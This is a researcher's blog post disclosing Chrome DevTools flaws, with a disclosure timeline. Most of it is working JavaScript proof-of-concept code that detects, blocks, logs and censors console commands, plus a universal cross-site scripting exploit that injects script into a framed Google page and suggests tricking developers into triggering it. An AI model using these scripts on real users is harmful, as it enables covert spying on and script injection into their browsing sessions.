<!DOCTYPE html>
<html lang="en">
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.1.0/css/bootstrap.min.css" type="text/css" rel="stylesheet">
    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
    <link href="/assets/css/screen.css" type="text/css" rel="stylesheet">
    <script type="text/javascript" src="//use.typekit.net/xkx0oup.js"></script>
    <script type="text/javascript">try{Typekit.load();}catch(e){};</script>
    <title>Google Chrome Universal XSS | Hydrant Labs</title>
  </head>
  <body onload="prettyPrint()">
    <div class="main-container">
      <div class="navbar navbar-default navbar-main">
        <div class="container">
          <div class="navbar-header">
            <button type="button" data-toggle="collapse" data-target=".navbar-collapse" class="navbar-toggle"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><a href="#" class="navbar-brand"><img src="/assets/images/logo.png" class="logo"><span class="mix-green">Hydrant </span><span class="mix-gray">Labs</span></a>
          </div>
          <div class="navbar-collapse collapse">
            <ul class="nav navbar-nav navbar-right">
              <li><a href="/index.html" class="mix-gray">Home</a></li>
              <li><a href="/Projects/index.html" class="mix-gray">Projects</a></li>
              <li><a href="/Security/index.html" class="mix-gray">Security</a></li>
              <li><a href="/Contact/index.html" class="mix-gray">Contact</a></li>
            </ul>
          </div>
        </div>
      </div>
      <div class="container"><h1 id="exploiting-the-google-chrome-developer-tools">Exploiting the Google Chrome Developer Tools</h1>
<p>Recently, there was a front page Hacker News post asking <a href="https://news.ycombinator.com/item?id=7222129">How does Facebook disable Developer Tools?</a> which linked a Stack Overflow question <a href="http://stackoverflow.com/questions/21692646/how-does-facebook-disable-developer-tools">here</a>. With the first part of the vulnerabilities I discovered being widely availible online I figured now was a good of time as any to write a post the rest of them.</p>
<p>On a quick note before I get into the post, I&#39;m looking for a Software Development or Information Security Internship/Mentorship in the Minneapolis/Twin Cities area. If you happen to have a position available, or know someone who does, please check out my <a href="">LinkedIn</a> and if you feel I would be a good fit, contact me <a href="">here</a>.</p>
<p>The vulnerabilities disclosed in the post have the following capabilities:</p>
<ul>
<li>Detect the opening and executing of commands in the console. (Unpatched)</li>
<li>Prevent the execution of commands in the console (Unpatched)</li>
<li>Log the commands that are executed in the console (Unpatched)</li>
<li>Censor variables from being accessed/read from the console (Unpatched)</li>
<li>Other unexplored potential vulnerabilities that are children of these (Unpatched)</li>
<li>Use these vulnerabilities to execute arbitrary scripts on webpages that can be framed (Patched)</li>
</ul>
<p>To be clear, I have responsibly disclosed these vulnerabilities almost a full year ago and unless otherwise noted they remain unpatched. By Google&#39;s own <a href="http://googleonlinesecurity.blogspot.com/2010/07/rebooting-responsible-disclosure-focus.html">responsible disclose guidelines</a> I have given many many months past the 60 day grace period for the issues to be fixed. You can find a full timeline of the issues reported in this post at the bottom. No reward was presented for the findings. I want to note that at the time of reporting the issues, I was only a Junior in high school and did not a have a large amount of experience reporting vulnerabilities. I have since gained more experience and looking back there are things I would have done differently, however I still believe that communication from Google could have been better overall. </p>
<p>The post is split up into the following sections, feel free to skip around, however it will make the most sense when read from top to bottom:</p>
<ul>
<li><a href="#Introduction">Introduction</a></li>
<li><a href="#Vulnerability_I">Vulnerability I</a></li>
<li><a href="#Blocking_Console_Access_Simple">Blocking Console Access (Simple)</a></li>
<li><a href="#Introduction_Part_II">Introduction Part II</a></li>
<li><a href="#Vulnerability_II">Vulnerability II</a></li>
<li><a href="#Blocking_Console_Access_Advanced">Blocking Console Access (Advanced)</a></li>
<li><a href="#Console_Logging">Console Logging</a></li>
<li><a href="#Console_Censorship">Console Censorship</a></li>
<li><a href="#UXSS">Universal Cross Site Scripting</a></li>
<li><a href="#Final_Vulnerabilities">Final Vulnerabilities</a></li>
<li><a href="#Summary">Summary</a></li>
<li><a href="#Timeline">Timeline</a></li>
</ul>
<h2 id="-a-name-introduction-a-introduction"><a name="Introduction"></a> Introduction</h2>
<p>Our story starts with a file named <a href="https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js">InjectedScriptSource.js</a> in the Chromium source code. This file is responsible for executing commands from the console you see when the developer tools are opened. I can hear people saying it already:</p>
<blockquote>
<p>Wait just one second, why is a JavaScript file responsible for executing commands? I thought Chrome/Chromium is written in C++ not JavaScript.</p>
</blockquote>
<p>You are correct, the majority of Chrome/Chromium is not written in JavaScript, but the devtools are actually a webpage in and of themselves. As quick proof you can inspect the devtools page itself which is hosted at <code>chrome-devtools://devtools/bundled/devtools.html</code> by pressing the devtools shortcut on a un-docked, focused, devtools window. </p>
<p>But we&#39;re getting distracted from the original story. In the file <a href="https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js">InjectedScriptSource.js</a> around <a href="https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptSource.js&amp;l=624">line 624</a> in the function <code>_evaluateOn</code> we can see the following code:</p>
<pre class="prettyprint lang-javascript">prefix = &quot;with ((console &amp;&amp; console._commandLineAPI) || { __proto__: null }) {&quot;;
suffix = &quot;}&quot;;
// *snip*
expression = prefix + &quot;\n&quot; + expression + &quot;\n&quot; + suffix;
</pre>
<p>This function is one of many that are run when code is evaluated from the devtools console. This function is rather important because it is where devtools specific functions like <code>copy(&#39;String to Clip Board&#39;)</code> and <code>clear()</code> are added. These functions are members of the class <code>CommandLineAPI</code> of which <code>console._commandLineAPI</code> is an instance of. </p>
<h2 id="-a-name-vulnerability_i-a-vulnerability-i"><a name="Vulnerability_I"></a>Vulnerability I</h2>
<p>Here&#39;s where things start to get interesting. I had the idea (and apparently someone at FaceBook too) to make use of the Getters and Setters added in ECMAScript 5. Getters and Setters allow a script to define a function to run when a key is retrieved or set. In this case, we&#39;re going to set one on the <code>console</code> object for the key <code>_commandLineAPI</code> with the following code:</p>
<pre class="prettyprint lang-javascript">Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  console.log(&#39;A command was run&#39;);
 }
});
</pre>
<p>You&#39;ll notice that if you view a page with this script (demo <a href="">here</a>) as you are typing the script will report a command is being run before you press enter. This is because every few keypresses the devtools will attempt to lookup code completion suggestions, which qualify as their own command.</p>
<h2 id="-a-name-blocking_console_access_simple-a-blocking-console-access-simple-"><a name="Blocking_Console_Access_Simple"></a>Blocking Console Access (Simple)</h2>
<p>So detecting when the console is loaded and when commands are run is fun, but let&#39;s see if we can try to disable commands. This is the same way FaceBook has created the same feature to warn users of potential attacks:</p>
<pre class="prettyprint lang-javascript">Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  throw &#39;Console Disabled&#39;;
 }
});
</pre>
<p>As you can see simply throwing an error when the <code>_commandLineAPI</code> is retrieved will prevent a command from being run or suggestions from working successfully. </p>
<h2 id="-a-name-introduction_part_ii-a-introduction-part-ii"><a name="Introduction_Part_II"></a>Introduction Part II</h2>
<p>Before I can continue into a more advanced blocking of console access and other related exploits we have to first talk about JavaScript again. When a JavaScript function is created a scope for the function is created with a local variable <code>arguments</code> that contains an array of the arguments passed to the function. This has a few uses as one can imagine:</p>
<pre class="prettyprint lang-javascript">function argCounter() {
 console.log(&#39;This function was run with &#39; + arguments.length + &#39; arguments.&#39;);
}
argCounter(); // 0
argCounter(&#39;Hello&#39;, &#39;World&#39;) // 2
argCounter(1, 2, 4, 8, 16, 32, 64) // 7
</pre>
<p>One of the less common known facts is that <code>arguments</code> is not an array but infact an object. This is why many JavaScript developers have encountered the following code which converts the object to a traditional JavaScript array:</p>
<pre class="prettyprint lang-javascript">var args = Array.prototype.slice.call(arguments)
</pre>
<p>One of the reasons arguments is an object is it has a few reserved keys such as <code>callee</code> which refers to the currently executing function within it&#39;s own body. An example use case might be (where only anonymous functions are used):</p>
<pre class="prettyprint lang-javascript">// Traverse an object looking for the &#39;World&#39; key value
var traverse = function(obj) {
 // Loop each key
 for (var index in obj) {
  // If another object
  if (typeof obj[index] === &#39;object&#39;) {
   // Recursion yay!
   arguments.callee(obj[index]);
  }
  // If matching
  if (index === &#39;World&#39;) {
   console.log(&#39;Found world: &#39; + obj[index]);
  }
 }
};
// Call traverse on our object
traverse({
 &#39;Nested&#39;: {
  &#39;Hello&#39;: {
   &#39;World&#39;: &#39;Earth&#39;
  }
 }
});
</pre>
<p>While this knowledge is pretty rare, the knowledge of the deprecated <code>arguments.callee.caller</code> is even rarer. This allows a script to reference the function that called it. It has little practical use, but I&#39;ve attempted to create an example:</p>
<pre class="prettyprint lang-javascript">// Print the ID of the caller of this function
function call_Jim() {
 // Get the calling function name without the call_Jim_as part
 return &#39;Hi &#39; + arguments.callee.caller.name.substring(&#39;call_Jim_as_&#39;.length) + &#39;!&#39;; 
}
// Call Jim as John
function call_Jim_as_John() {
 return call_Jim();
}
// Call Jim as Luke
function call_Jim_as_Luke() {
 return call_Jim();
}
// Test cases
call_Jim_as_John(); // &#39;Hi John!&#39;
call_Jim_as_Luke(); // &#39;Hi Luke!&#39;
</pre>
<p>Now, to get an another level deeper, we can call <code>arguments.callee.caller.arguments</code> and continue to traverse our way up the call stack to the top. </p>
<h2 id="-a-name-vulnerability_ii-a-vulnerability-ii"><a name="Vulnerability_II"></a>Vulnerability II</h2>
<p>Using the above mentioned <code>arguments.callee.caller</code> functionality is where our second (and more valuable) vulnerability comes in. When a function is executed in the standard context with no parent functions <code>arguments.callee.caller</code> will simply be <code>null</code>. However, when a script is executed from the devtools console, instead of being null (as one would expect) it is instead the function <code>_evaluateOn</code> first mentioned at the beginning of the post. For example running the following code in the console will dump the source for the <code>_evaluateOn</code> function:</p>
<pre class="prettyprint lang-javascript">(function () {
 return arguments.callee.caller;
})();
</pre>
<p>I can already hear the questions again:</p>
<blockquote>
<p>I guess this is bad, but what does it have to do with the first vulnerability and what can I do with it?</p>
</blockquote>
<p>Let&#39;s start with the relationship with the first vulnerability. In this case, getting a victim to copy and paste code such as the above is going to be difficult at best. What happens if we were to combine this with the initial vulnerability? We get the following:</p>
<pre class="prettyprint lang-javascript">Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  console.log(arguments.callee.caller);
 }
});
</pre>
<p>As you can see when these are combined, we get a script that can dump internal devtools sources when any key is pressed on the console. But I can still here the question:</p>
<blockquote>
<p>So what? I can see those sources by looking at the Chromium source online. What&#39;s the big deal?</p>
</blockquote>
<p>The &#39;aha&#39; moment for this exploit is this: <code>arguments.callee.caller.arguments</code> (notice the additional arguments key). This means that yes, our insecure code from an untrusted source can access internal devtools variables and objects in (at the time of this writing) all channels (stable, beta, dev, canary) of Chrome/Chromium.</p>
<p>So, let&#39;s take a look at how we can exploit this. Let&#39;s start by seeing what our options are by creating a simple page:</p>
<pre class="prettyprint lang-html">&lt;script&gt;
Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  console.log(arguments.callee.caller.arguments[2]);
 }
});
&lt;/script&gt;
</pre>
<p>Then running a command like <code>alert(1)</code> on the console which will result in the following (ignoring completion commands for now):</p>
<pre>0: function evaluate() { [native code] }
1: InjectedScriptHost
2: &quot;console&quot;
3: &quot;with ((console &amp;&amp; console._commandLineAPI) || {}) {↵alert(1)↵}&quot;
4: false
5: true
</pre><p>Let&#39;s take a look at the second argument, InjectedScriptHost, to start. Looking in the Chromium source we can find that this object correlates with <a href="https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/core/inspector/InjectedScriptExterns.js">InjectedScriptExterns.js</a>. The InjectedScriptHost object contains a few methods, I&#39;m going to focus on a few important ones:</p>
<ul>
<li><strong>clearConsoleMessages</strong> - Clears the console and deletes the scrollback<pre class="prettyprint lang-javascript">InjectedScriptHost.clearConsoleMessages();
</pre>
</li>
<li><strong>functionDetails</strong> - Returns details about a function<pre class="prettyprint lang-javascript">// Create a function with a bound this
InjectedScriptHost.functionDetails(func);
</pre>
</li>
<li><strong>inspect</strong> - Inspect a dom object, doesn&#39;t switch to the inspect tab.<pre class="prettyprint lang-javascript">// Inspect the body node
InjectedScriptHost.inspect(document.body);
</pre>
</li>
<li><strong>inspectedObject</strong> - Retrieve an object from the history of inspected objects.<pre class="prettyprint lang-javascript">// Get the first inspected object
InjectedScriptHost.inspectedObject(0);
</pre>
</li>
</ul>
<h2 id="-a-name-blocking_console_access_advanced-a-blocking-console-access-advanced-"><a name="Blocking_Console_Access_Advanced"></a>Blocking Console Access (Advanced)</h2>
<p>Now that we have an idea of the possible functions we can use, let&#39;s build a more advanced console blocking script. In this one, we want to still disable the console, but without the red, ugly error message when a command is run. Let&#39;s start with what happens when a command is run on the console. The <code>_evaluateOn</code> function is passed a few arguments:</p>
<pre>evalFunction: function evaluate() { [native code] }
object: InjectedScriptHost
objectGroup: &#39;console&#39;
expression: &#39;alert(1)&#39;
isEvalOnCallFrame: false
injectCommandLineAPI: true
</pre><p>And then runs the following code (modified for readability):</p>
<pre class="prettyprint lang-javascript">var prefix = &quot;&quot;;
var suffix = &quot;&quot;;
if (injectCommandLineAPI &amp;&amp; inspectedWindow.console) {
 inspectedWindow.console._commandLineAPI = new CommandLineAPI(this._commandLineAPIImpl, isEvalOnCallFrame ? object : null);
 prefix = &quot;with ((console &amp;&amp; console._commandLineAPI) || { __proto__: null }) {&quot;;
 suffix = &quot;}&quot;;
}
if (prefix)
 expression = prefix + &quot;\n&quot; + expression + &quot;\n&quot; + suffix;
var result = evalFunction.call(object, expression);
</pre>
<p>A quick look at the <code>evalFunction</code> will tell us that it&#39;s merely <code>InjectedScriptHost.evaluate</code>. Too bad we don&#39;t have any way to override that, oh wait, we can just add a setter. Here&#39;s a quick proof of concept that will disable the console with no errors logged:</p>
<pre class="prettyprint lang-javascript">// First run
var run = false;
// On console command run
Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, &#39;evaluate&#39;, {
    get: function () {
     // Return a alternate evaluate function
     return function() {
      return &quot;The console has been disabled&quot;;
     }
    }
   });
  }
 }
});
</pre>
<h2 id="-a-name-console_logging-a-console-logging"><a name="Console_Logging"></a>Console Logging</h2>
<p>Okay, you can probably guess that the point of the above exercise was not to remove the red text. Let&#39;s have some more fun, let&#39;s write a script that allows the console to act exactly as expected, but log all commands run and their results. This could easily be sent to a server for logging, but I&#39;ll leave that implementation up to you, the reader. One quick note, this implementation ignores suggestions, this is because suggestions are implemented as such that they are only a result of a array, and cannot be easily logged. So, onto the proof of concept:</p>
<pre class="prettyprint lang-javascript">// First run
var run = false;
// Save the command line api
var _commandLineAPI = null;
// On console command run
Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, &#39;evaluate&#39;, {
    get: function () {
     // Return a alternate evaluate function
     return function(command) {
      // Get the commands split
      var commands = command.split(&quot;\n&quot;);
      // Execute the real evaluate function
      var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
      // Ignore suggustion executions for now
      if (commands.length &lt;= 1 || (result &amp;&amp; result.name === &#39;getCompletions&#39;)) {
       return result;
      }
      // Remove the first &quot;with...&quot; and last &quot;}&quot; lines
      command = commands.slice(1, -1).join(&quot;\n&quot;);
      // Next step to ignore suggustion checks
      if (command.trim() === &#39;this&#39;) {
       return result;
      }
      // Log the command and result (tries to lazily parse to a string for now)
      document.write(&quot;Attempted Command:&lt;br /&gt;&lt;pre&gt;&quot; + command + &quot;&lt;/pre&gt;&quot;);
      document.write(&quot;Command Result:&lt;br /&gt;&lt;pre&gt;&quot; + result + &quot;&lt;/pre&gt;&lt;hr /&gt;&quot;);
      // Return the result
      return result;
     }
    }
   });
  }
  // Return the actual command line api
  return _commandLineAPI;
 },
 set: function(value) {
  // Copy the value
  _commandLineAPI = value;
 }
});
</pre>
<h2 id="-a-name-console_censorship-a-console-censorship"><a name="Console_Censorship"></a>Console Censorship</h2>
<p>Logging commands is fun, but let&#39;s see if we can censor a variable from being accessed without viewing a source. Here&#39;s a quick proof of concept (it&#39;s not 100% perfect, but should give a good understanding of what can be done):</p>
<pre class="prettyprint lang-javascript">// Add our secret key and value
window.secret = &#39;Top secret key here&#39;;
// First run
var run = false;
// Save the command line api
var _commandLineAPI = null;
// On console command run
Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  // Only run once
  if (!run) {
   run = true;
   // Get the InjectedScriptHost
   var InjectedScriptHost = arguments.callee.caller.arguments[1];
   // On evaluate
   Object.defineProperty(InjectedScriptHost, &#39;evaluate&#39;, {
    get: function () {
     // Return a alternate evaluate function
     return function(command) {
      // Execute the real evaluate function
      var result = InjectedScriptHost.__proto__.evaluate.apply(this, arguments);
      // When the command was a attempt to access the completions
      if (result &amp;&amp; result.name === &#39;getCompletions&#39;) {
       // Return a new completions function
       return function() {
        // Get the completions
        var completions = result.apply(this, arguments);
        // Remove the secret completion
        delete completions.secret;
        // Return the modified values
        return completions;
       }
      }
      // If the result is our secret value
      if (result === window.secret) {
       return undefined;
      }
      // Return the result
      return result;
     }
    }
   });
  }
  // Return the actual command line api
  return _commandLineAPI;
 },
 set: function(value) {
  // Copy the value
  _commandLineAPI = value;
 }
});
</pre>
<h2 id="-a-name-uxss-a-universal-cross-site-scripting"><a name="UXSS"></a>Universal Cross Site Scripting</h2>
<p>Let&#39;s get into the one vulnerability that has been patched. This vulnerability allowed a malicious website to inject arbitrary scripts, html, etc to any website that could be framed via an iframe with some user interaction. It works pretty simply, when a user inspects an element, it is added to a history array. A user can access it via <code>console.$0</code>, but unfortunately cannot access this if it is executed from a different domain. For the exploit to be viable: A user must right click a iframe element, then open the console and begin to type a command. </p>
<p>While this is clearly a convoluted path, there are many ways to have a user complete these actions. For example, I have hypothesized a following game:</p>
<pre>SpaceShip Wars
The game involves a user playing against a computer battling their own SpaceShips.
When a SpaceShip is damaged, it must be repaired by a user.
To repair a part, the user must right click and inspect the individual element to fix it.
Once the element is being inspected they can fix it by typing &quot;fix&quot; in the Console.
</pre><p>Of course, there are many social engineering options possible to trick users to attack themselves. Personally, I think the best option would be to simply do nothing and wait for developers (the more valuable targets) to attack themselves. But, onto the proof of concept. It has a simple, full screen, invisible iframe of picasa.google.com (contains/contained Google domain cookies). Inspecting any point on the page, then beginning to type a command on the console will trigger a <code>alert(document.domain)</code> from the iframe:</p>
<pre class="prettyprint lang-javascript">// On console command run
Object.defineProperty(console, &#39;_commandLineAPI&#39;, {
 get: function () {
  // Save a reference to the InjectedScriptHost globally
  window.InjectedScriptHost = arguments.callee.caller.arguments[1];
  // Get the injectedScript object
  window.injectedScript = InjectedScriptHost.functionDetails(arguments.callee.caller.arguments.callee).rawScopes[0].object.injectedScript;
  // Trigger another inspect (not sure why this helps but it does)
  injectedScript._inspect(document.getElementById(&#39;hacks&#39;));
  // Keep checking if an element has been inspected every 10th of a second
  var check = function() {
   // Hide any errors on the console to keep people unaware
   try {
    // Get the first inspected object
    var el = injectedScript._commandLineAPIImpl._inspectedObject(1);
    // Loop until no more parents
    while (el.parentNode) { el = el.parentNode; }
    // If the element is not the current page
    if (el.URL !== window.location.href) {
     // Stop checking
     clearInterval(check);
     // Create the script element
     var script = document.createElement(&#39;script&#39;);
     script.type = &#39;text/javascript&#39;;
     script.innerHTML = &quot;alert(document.domain)&quot;;
     // Add the script to the frame
     el.getElementsByTagName(&#39;head&#39;)[0].appendChild(script);
    }
   } catch (e) {}
  };
  // Return the orginal evaluate function
  return InjectedScriptHost.__proto__.evaluate;
 }
});
</pre>
<p>As you can see there is clearly a lot of potential for abuse here, thankfully this issue was patched. Though not by the Chrome team (as far as I can tell) by the WebKit team <a href="http://trac.webkit.org/changeset/138228">here</a>.</p>
<h2 id="-a-name-final_vulnerabilities-a-final-vulnerabilities"><a name="Final_Vulnerabilities"></a>Final Vulnerabilities</h2>
<p>You may have noticed the use of <code>InjectedScriptHost.functionDetails</code>. This is the most powerful function and opens a whole bunch of doors to other potential issues. The <code>functionDetails</code> allows the inspection of a functions location (which file and what line) as well as the scopes that function executes in. Here&#39;s a quick example of it&#39;s use in a generic setting:</p>
<pre class="prettyprint lang-javascript">// Add another scope
with ({
 &#39;test&#39;: true
}) {
 var func = function() {}
}
// Log the details
console.log(InjectedScriptHost.functionDetails(func));
</pre>
<p>Which returns the following result:</p>
<pre>{
 location: {
  columnNumber: 14,
  lineNumber: 4,
  scriptId: &quot;1262&quot;
 },
 name: &quot;func&quot;,
 rawScopes: [
  {
   object: {
    test: true
   },
   type: 2
  }, {
   object: { },
   type: 2
  }, {
   object: [object Window],
   type: 3
  }
 ]
}
</pre><p>As you can see this has some powerful potentials, particularly when applied to internal functions. For example, when applied to the <code>_evaluateOn</code> function we get the following result:</p>
<pre>{
 inferredName: &quot;InjectedScript._evaluateOn&quot;,
 location: {
  columnNumber: 25,
  lineNumber: 591,
  scriptId: &quot;1417&quot;
 },
 rawScopes: [
  {
   object: {
    CommandLineAPI: function CommandLineAPI(commandLineAPIImpl, callFrame)
    InjectedScript: function ()
    InjectedScriptHost: InjectedScriptHost
    Object: function Object() { [native code] }
    bind: function bind(func, thisObject, var_args)
    injectedScript: InjectedScript
    injectedScriptId: 58
    inspectedWindow: Window
    slice: function slice(array, index)
    toString: function toString(obj)
   },
   type: 3
  }, {
   object: [object Window],
   type: 0
  }
 ]
}
</pre><p>There are all sorts of internal objects inside these functions that have the potential for other abuse. A wrote a quick function that loops all functions it can find and lists the potentially valuable ones (all scopes not the current window):</p>
<pre class="prettyprint lang-javascript">// Run via console as `listScopes();`
function listScopes() {
 // Total results
 var results = 0;
 // Ignore these because they are cyclical
 var cyclical = [
  &#39;window.top&#39;,
  &#39;window.window&#39;,
  &#39;window.clientInformation.mimeTypes&#39;,
  &#39;window.clientInformation.plugins&#39;,
  &#39;window.console._commandLineAPI.$_&#39;,
  &#39;func[0].object.inspectedWindow&#39;,
  &#39;func[1].object&#39;
 ];
 // Element that have been chacked already
 var checked = [];
 // Save a reference to the InjectedScriptHost globally
 var InjectedScriptHost = arguments.callee.caller.arguments[1];
 // Get the scope of a function
 window.scope = function(func, i) {
  return InjectedScriptHost.functionDetails(func).rawScopes[i].object;
 }
 // Check the scopes of an object
 function checkScopes(current_name, obj) {
  // Loop each key
  for (var index in obj) {
   // If the var has not been checked
   if (checked.indexOf(obj[index]) === -1) {
    checked.push(obj[index]);
    var name = current_name;
    if (isNaN(index)) {
     name = name + &#39;.&#39; + index;
    } else {
     name = name + &#39;[&#39; + index + &#39;]&#39;;
    }
    // If not cyclical
    if (cyclical.indexOf(name) === -1) {
     // If an array or object
     if (typeof obj[index] === &#39;object&#39;) {
      // Yay recursion
      checkScopes(name, obj[index]);
     }
    }
    if (typeof obj[index] === &#39;function&#39;) {
     // Get the scopes
     var scopes = InjectedScriptHost.functionDetails(obj[index]).rawScopes;
     // Don&#39;t index our scopes function
     if (obj[index] !== window.scope) {
      // Loop each scope
      for (var i in scopes) {
       // If it&#39;s not a window
       if (InjectedScriptHost.internalConstructorName(scopes[i].object) !== &#39;Window&#39;) {
        name = &#39;scope(&#39; + name + &#39;, &#39; + i + &#39;)&#39;;
        // Add the path
        console.log(name);
        results++;
        // Recursion again
        checkScopes(name, scopes[i].object);
       }
      }
     }
    }
   }
  }
 }
 // Check all known objects
 checkScopes(&#39;window&#39;, window);
 window.args = arguments.callee.caller.arguments;
 checkScopes(&#39;args&#39;, args);
 window.func = InjectedScriptHost.functionDetails(arguments.callee.caller).rawScopes;
 checkScopes(&#39;func&#39;, func);
 // Return
 return &quot;Searching finished, found &quot; + results + &quot; results.&quot;;
};
</pre>
<p>It can be run via <code>listScopes()</code> on the console. It is probably buggy, and misses a few potential paths, but it gives a quick idea of the potential. </p>
<h2 id="-a-name-summary-a-summary"><a name="Summary"></a>Summary</h2>
<p>The vulnerabilities outlined in the post allow the following:</p>
<ul>
<li>Detect the opening and executing of commands in the console. (Unpatched)</li>
<li>Prevent the execution of commands in the console (Unpatched)</li>
<li>Log the commands that are executed in the console (Unpatched)</li>
<li>Censor variables from being accessed/read from the console (Unpatched)</li>
<li>Other unexplored potential vulnerabilities that are children of these (Unpatched)</li>
<li>Use these vulnerabilities to execute arbitrary scripts on webpages that can be framed (Patched)</li>
</ul>
<p>The exploits require little technical ability to exploit (many people can write some simple JavaScript), and the majority of them have remained unpatched for over a year. I hope that this post will help get those vulnerabilities fixed. </p>
<h2 id="-a-name-timeline-a-timeline"><a name="Timeline"></a>Timeline</h2>
<ul>
<li>February 25th, 2013: Disclosed to vendor (Google)</li>
<li>February 25th, 2013: Initial vendor response</li>
<li>February 26th, 2013: Issue marked as Priority 0</li>
<li>February 26th, 2013: Response from vendor</li>
<li>February 27th, 2013: Response to vendor with more information about severity</li>
<li>February 27th, 2013: Issue marked as Priority 2 and Severity Low</li>
<li>February 28th, 2013: Communication with vendor</li>
<li>September 27th, 2013: Request to disclose vulnerability publicly (no response)</li>
<li>February 5th, 2014: Issue made public <a href="https://code.google.com/p/chromium/issues/detail?id=178336">here</a></li>
</ul>

      </div>
      <div class="footer-space"></div>
      <div class="footer">
        <div class="container">
          <p class="muted credit"><span>&copy; 2013 Luke Young. All rights reserved.</span><span class="footer-divider">|</span><span>This site is proudly hosted on <a href="https://digitalocean.com/">Digital Ocean</a>.</span><span class="footer-divider">|</span><span>Site designed, built, and maintained by <a href="http://hydrantlabs.com">Luke Young</a>.</span></p>
        </div>
      </div>
    </div>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.0/jquery.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.1.0/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/prettify/r298/prettify.min.js"></script>
    <script>
      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
      
      ga('create', 'UA-44361710-1', 'hydrantlabs.org');
      ga('send', 'pageview');
    </script>
  </body>
</html>